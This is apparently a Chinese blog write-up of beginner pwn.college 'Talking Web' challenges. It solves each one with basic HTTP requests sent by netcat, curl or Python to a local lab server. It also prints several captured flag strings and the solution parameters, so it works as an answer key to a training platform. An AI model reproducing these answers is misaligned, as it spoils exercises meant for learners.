<h4 id="3-Commented-Data"><a href="#3-Commented-Data" class="headerlink" title="3. Commented Data"></a>3. Commented Data</h4><p>查看源码，发现在注释中存在flag。随后，F12查看页面源码就行了。</p>
<h4 id="4-HTTP-MetaData"><a href="#4-HTTP-MetaData" class="headerlink" title="4. HTTP MetaData"></a>4. HTTP MetaData</h4><p>查看源码，路径为<code>/fulfill</code>，F12打开开发者模式，然后在Network中，找到fulfill这一项，点击后在右边找到Header，其中X-FLAG字段就是flag</p>
<h4 id="5-HTTP-netcat"><a href="#5-HTTP-netcat" class="headerlink" title="5. HTTP (netcat)"></a>5. HTTP (netcat)</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hacker</span>@talking-web~http-netcat:~/Desktop$ nc challenge.localhost <span class="number">80</span></span><br><span class="line"><span class="attribute">GET</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: Werkzeug/<span class="number">3</span>.<span class="number">0</span>.<span class="number">6</span> Python/<span class="number">3</span>.<span class="number">8</span>.<span class="number">10</span></span><br><span class="line"><span class="attribute">Date</span>: Sun, <span class="number">02</span> Mar <span class="number">2025</span> <span class="number">12</span>:<span class="number">59</span>:<span class="number">11</span> GMT</span><br><span class="line"><span class="attribute">Content</span>-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">84</span></span><br><span class="line"><span class="attribute">X</span>-Flag: pwn.college&#123;YrqEpNPZzcBDnBQkJiogkaSfKN0.dljNyMDLxYTN1YzW&#125;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;html&gt;</span><span class="section">&lt;head&gt;</span><span class="section">&lt;title&gt;</span><span class="attribute">Talking</span> Web&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Great job!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>思路就是，使用nc命令，获取网页信息。并且使用GET请求，随后接收到响应。响应中存在flag。</p>
<blockquote>
<p>记住，输入两次回车，才是结束本次请求。</p>
</blockquote>
<h4 id="6-HTTP-Paths-netcat"><a href="#6-HTTP-Paths-netcat" class="headerlink" title="6. HTTP Paths (netcat)"></a>6. HTTP Paths (netcat)</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hacker</span>@talking-web~http-paths-netcat:~/Desktop$ nc challenge.localhost <span class="number">80</span></span><br><span class="line"><span class="attribute">GET</span> /hack HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: Werkzeug/<span class="number">3</span>.<span class="number">0</span>.<span class="number">6</span> Python/<span class="number">3</span>.<span class="number">8</span>.<span class="number">10</span></span><br><span class="line"><span class="attribute">Date</span>: Sun, <span class="number">02</span> Mar <span class="number">2025</span> <span class="number">13</span>:<span class="number">04</span>:<span class="number">48</span> GMT</span><br><span class="line"><span class="attribute">Content</span>-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">243</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="section">&lt;html&gt;</span></span><br><span class="line">          <span class="section">&lt;head&gt;</span><span class="section">&lt;title&gt;</span><span class="attribute">Talking</span> Web&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">        <span class="section">&lt;body&gt;</span></span><br><span class="line">          <span class="section">&lt;h1&gt;</span><span class="attribute">Great</span> job!&lt;/h1&gt;</span><br><span class="line">          <span class="section">&lt;!-- TOP SECRET: &lt;p&gt;</span><span class="attribute">pwn</span>.college&#123;s97BHDSXwCrre5GEUP0gFK5CKc_.dVzNyMDLxYTN1YzW&#125;&lt;/p&gt; --&gt;</span><br><span class="line">        <span class="section">&lt;/body&gt;</span></span><br><span class="line">        <span class="section">&lt;/html&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>多了一个路径而已。</p>
<h4 id="7-HTTP-curl"><a href="#7-HTTP-curl" class="headerlink" title="7. HTTP (curl)"></a>7. HTTP (curl)</h4><p><code>curl</code>是一个强大的命令行工具，用于与服务器进行数据传输。它支持多种协议。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl [选项] [URL]</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-X</code> 或 <code>--request</code></td>
<td align="left">指定 HTTP 请求方法（如 GET、POST、PUT、DELETE）。</td>
</tr>
<tr>
<td align="left"><code>-H</code> 或 <code>--header</code></td>
<td align="left">添加 HTTP 请求头。</td>
</tr>
<tr>
<td align="left"><code>-d</code> 或 <code>--data</code></td>
<td align="left">发送 POST 请求的数据（表单数据）。</td>
</tr>
<tr>
<td align="left"><code>-F</code> 或 <code>--form</code></td>
<td align="left">发送文件或表单数据（用于文件上传）。</td>
</tr>
<tr>
<td align="left"><code>-o</code> 或 <code>--output</code></td>
<td align="left">将输出保存到文件。</td>
</tr>
<tr>
<td align="left"><code>-O</code></td>
<td align="left">将输出保存为文件名（从 URL 中提取文件名）。</td>
</tr>
<tr>
<td align="left"><code>-i</code> 或 <code>--include</code></td>
<td align="left">显示响应头信息。</td>
</tr>
<tr>
<td align="left"><code>-I</code> 或 <code>--head</code></td>
<td align="left">仅显示响应头信息（HEAD 请求）。</td>
</tr>
<tr>
<td align="left"><code>-u</code> 或 <code>--user</code></td>
<td align="left">指定用户名和密码（用于认证）。</td>
</tr>
<tr>
<td align="left"><code>-v</code> 或 <code>--verbose</code></td>
<td align="left">显示详细请求和响应信息。</td>
</tr>
<tr>
<td align="left"><code>-L</code> 或 <code>--location</code></td>
<td align="left">自动跟随重定向。</td>
</tr>
<tr>
<td align="left"><code>-k</code> 或 <code>--insecure</code></td>
<td align="left">忽略 SSL 证书验证。</td>
</tr>
<tr>
<td align="left"><code>-s</code> 或 <code>--silent</code></td>
<td align="left">静默模式，不显示进度和错误信息。</td>
</tr>
<tr>
<td align="left"><code>-A</code> 或 <code>--user-agent</code></td>
<td align="left">设置 User-Agent 请求头。</td>
</tr>
</tbody></table>
<p>这题很简单了，直接curl就好了。</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">hacker@talking-web~http-curl:~/Desktop$ curl challenge</span></span><br><span class="line"><span class="language-xml">.localhost/pwn</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Talking Web<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Great job!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">p</span>&gt;</span>pwn.college</span><span class="template-variable">&#123;UNlBBwS-NwpLJYdlVPpEoojvICd.dRzNyMDLxYTN1YzW&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="8-HTTP-python"><a href="#8-HTTP-python" class="headerlink" title="8. HTTP (python)"></a>8. HTTP (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost/verify&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用python的requests模块，写个get请求即可。</p>
<h4 id="9-HTTP-Host-Header-python"><a href="#9-HTTP-Host-Header-python" class="headerlink" title="9. HTTP Host Header (python)"></a>9. HTTP Host Header (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost/submission&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;ctflearn.com:80&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="10-HTTP-Host-Header-curl"><a href="#10-HTTP-Host-Header-curl" class="headerlink" title="10. HTTP Host Header (curl)"></a>10. HTTP Host Header (curl)</h4><p>查一查curl的用法即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Host: overthewire.org:80&quot;</span> challenge.localhost/progress</span><br></pre></td></tr></table></figure>

<h4 id="11-HTTP-Host-Header-netcat"><a href="#11-HTTP-Host-Header-netcat" class="headerlink" title="11. HTTP Host Header (netcat)"></a>11. HTTP Host Header (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~http-host-header-netcat:~/Desktop$ nc -v challenge.localhost  80</span><br><span class="line">Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!</span><br><span class="line">GET /hack HTTP/1.1</span><br><span class="line">Host: gandalf.lakera.ai:80</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.10</span><br><span class="line">Date: Sun, 02 Mar 2025 13:36:13 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 222</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;html&gt;</span><br><span class="line">          &lt;<span class="built_in">head</span>&gt;&lt;title&gt;Talking Web&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">          &lt;h1&gt;Great job!&lt;/h1&gt;</span><br><span class="line">          &lt;p&gt;pwn.college&#123;IpeiHFr8AbndI-uKFGS8WxMBKHR.dJzNyMDLxYTN1YzW&#125;&lt;/p&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="12-URL-Encoding-netcat"><a href="#12-URL-Encoding-netcat" class="headerlink" title="12. URL Encoding (netcat)"></a>12. URL Encoding (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~url-encoding-netcat:~/Desktop$ nc -v challenge.localhost 80</span><br><span class="line">Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!</span><br><span class="line">GET /entry%20mission%20verify HTTP/1.1</span><br><span class="line">Host: challenge.localhost:80</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.10</span><br><span class="line">Date: Sun, 02 Mar 2025 13:42:45 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 222</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;html&gt;</span><br><span class="line">          &lt;<span class="built_in">head</span>&gt;&lt;title&gt;Talking Web&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">          &lt;h1&gt;Great job!&lt;/h1&gt;</span><br><span class="line">          &lt;p&gt;pwn.college&#123;gJwS5WKPnVX7YX3P2lEwKq0xpc3.dlzNyMDLxYTN1YzW&#125;&lt;/p&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>编码，空格在url编码中是<code>%20</code>，因此，在nc命令中使用<code>%20</code>代替即可。</p>
<h4 id="13-HTTP-GET-Parameters"><a href="#13-HTTP-GET-Parameters" class="headerlink" title="13. HTTP GET Parameters"></a>13. HTTP GET Parameters</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost/submit&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;unlock&quot;</span>: <span class="string">&quot;ufxxiiik&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;challenge.localhost:80&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url, headers=headers, params=params)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>加GET请求的参数。</p>
<h4 id="14-Multiple-HTTP-parameters-netcat"><a href="#14-Multiple-HTTP-parameters-netcat" class="headerlink" title="14. Multiple HTTP parameters (netcat)"></a>14. Multiple HTTP parameters (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~multiple-http-parameters-netcat:~/Desktop$ nc -v challenge.localhost 80</span><br><span class="line">Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!</span><br><span class="line">GET /pass?security=kifydwjj&amp;auth_key=mbdncplm&amp;keycode=zuqfwurr HTTP/1.1</span><br><span class="line">Host: challenge.localhost:80</span><br></pre></td></tr></table></figure>

<p>用nc命令，构造一个GET请求即可。</p>
<h4 id="15-Multiple-HTTP-parameters-curl"><a href="#15-Multiple-HTTP-parameters-curl" class="headerlink" title="15. Multiple HTTP parameters(curl)"></a>15. Multiple HTTP parameters(curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~multiple-http-parameters-curl:~/Desktop$ curl -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span>  <span class="string">&quot;http://challenge.localhost/authenticate?hash=jzsfndeg&amp;auth_pass=erdsycur&amp;access_code=sxobnyrn&quot;</span></span><br></pre></td></tr></table></figure>

<p>用双引号包括域名，使得<code>&amp;</code>被用作参数连接符。</p>
<h4 id="16-HTTP-Forms"><a href="#16-HTTP-Forms" class="headerlink" title="16. HTTP Forms"></a>16. HTTP Forms</h4><p>这关本来是直接打开浏览器访问提交表单就能拿到flag，但是那个太卡了，所以这里也用的python来发送Post请求。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost/request&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;verify&quot;</span>: <span class="string">&quot;mbobcxum&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;challenge.localhost:80&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Firefox&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>这里需要加<code>User-Agent</code>字段，是因为题目会检测是否采用的是Firefox打开。</p>
<h4 id="17-HTTP-Forms-curl"><a href="#17-HTTP-Forms-curl" class="headerlink" title="17. HTTP Forms (curl)"></a>17. HTTP Forms (curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~http-forms-curl:~/Desktop$ curl -X POST -d <span class="string">&quot;keycode=xqwrvyfd&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span> http://challenge.localhost/meet</span><br></pre></td></tr></table></figure>

<h4 id="18-HTTP-Forms-netcat"><a href="#18-HTTP-Forms-netcat" class="headerlink" title="18. HTTP Forms (netcat)"></a>18. HTTP Forms (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~http-forms-netcat:~/Desktop$ nc -v challenge.localhost 80</span><br><span class="line">Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!</span><br><span class="line">POST /check HTTP/1.1</span><br><span class="line">Host: challenge.localhost:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">private%5Fkey=bxildsjt</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>

<p>这里有一个很坑的点，必须得有<code>Content-Length</code>字段，且有这个字段后，就可以回车再回车。此时接收表单数据。再进行url编码。</p>
<h4 id="19-HTTP-Forms-python"><a href="#19-HTTP-Forms-python" class="headerlink" title="19. HTTP Forms (python)"></a>19. HTTP Forms (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost/progress&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="string">&quot;cboboidk&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;challenge.localhost:80&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Firefox/2.0.0.11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="20-HTTP-Forms-Without-Forms"><a href="#20-HTTP-Forms-Without-Forms" class="headerlink" title="20. HTTP Forms Without Forms"></a>20. HTTP Forms Without Forms</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost/verify&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;auth_key&quot;</span>: <span class="string">&quot;hhyrdgcr&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;challenge.localhost:80&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Firefox/2.0.0.11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="21-Multiple-Form-Fields-curl"><a href="#21-Multiple-Form-Fields-curl" class="headerlink" title="21. Multiple Form Fields (curl)"></a>21. Multiple Form Fields (curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~multiple-form-fields-curl:~/Desktop$ curl -X POST -d <span class="string">&quot;private_key=iqzryxmm&amp;secret_key=ufaeulmp&amp;secure_key=fgynzsij&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span> http://challenge.localhost/qualify</span><br></pre></td></tr></table></figure>

<h4 id="22-Multiple-Form-Fields-netcat"><a href="#22-Multiple-Form-Fields-netcat" class="headerlink" title="22. Multiple Form Fields (netcat)"></a>22. Multiple Form Fields (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~multiple-form-fields-netcat:~/Desktop$ nc -v challenge.localhost 80</span><br><span class="line">Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!</span><br><span class="line">POST /submission HTTP/1.1</span><br><span class="line">Host: challenge.localhost:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">authcode=gzevumwe&amp;password=zcfrbrpt&amp;verify=wpbxshiv&amp;signature=ktkceqld</span><br></pre></td></tr></table></figure>

<p>同理，参数也用<code>&amp;</code>连接即可。</p>
<h4 id="23-HTTP-Redirects-netcat"><a href="#23-HTTP-Redirects-netcat" class="headerlink" title="23. HTTP Redirects (netcat)"></a>23. HTTP Redirects (netcat)</h4><p>重定向，首先先发送正常的请求。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~http-redirects-netcat:~/Desktop$ nc -v challenge.localhost 80</span><br><span class="line">Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: challenge.localhost:80</span><br></pre></td></tr></table></figure>

<p>发现返回数据中，有重定向的paths，那么再用nc发送这个paths的请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~http-redirects-netcat:~/Desktop$ nc -v challenge.localhost 80</span><br><span class="line">Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!</span><br><span class="line">GET /eFsriunp-hack HTTP/1.1             </span><br><span class="line">Host: challenge.localhost:80</span><br></pre></td></tr></table></figure>

<h4 id="24-HTTP-Redirects-curl"><a href="#24-HTTP-Redirects-curl" class="headerlink" title="24. HTTP Redirects (curl)"></a>24. HTTP Redirects (curl)</h4><p>同理，用curl两次即可。</p>
<h4 id="25-HTTP-Redirects-python"><a href="#25-HTTP-Redirects-python" class="headerlink" title="25. HTTP Redirects (python)"></a>25. HTTP Redirects (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;challenge.localhost:80&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>python的requests模块能够自动跟踪重定向的网页，因此发送简单的GET请求即可。</p>
<h4 id="26-HTTP-Cookies-curl"><a href="#26-HTTP-Cookies-curl" class="headerlink" title="26. HTTP Cookies (curl)"></a>26. HTTP Cookies (curl)</h4><blockquote>
<p>Make an HTTP request to 127.0.0.1 on port 80 to get the flag. Make any HTTP request, and the server will ask you to set a cookie. Make another request with that cookie to get the flag.</p>
</blockquote>
<p>提示得很清楚了，先随便发送一个请求，然后设置cookie，随后发送另一个请求拿到flag。</p>
<p>可以使用<code>curl -L -v challenge.localhost</code>来自动跟踪重定向</p>
<p>第一次是为了拿到cookie，命令为<code>curl -L -v 127.0.0.1:80</code>，随后再curl一次，用<code>-b</code>参数携带cookie。然后就能获得flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~http-cookies-curl:~/Desktop$ curl -L -v -b <span class="string">&quot;cookie=3bfab8c85fbf73872c0b0a6956fc4620&quot;</span> 127.0.0.1:80</span><br></pre></td></tr></table></figure>

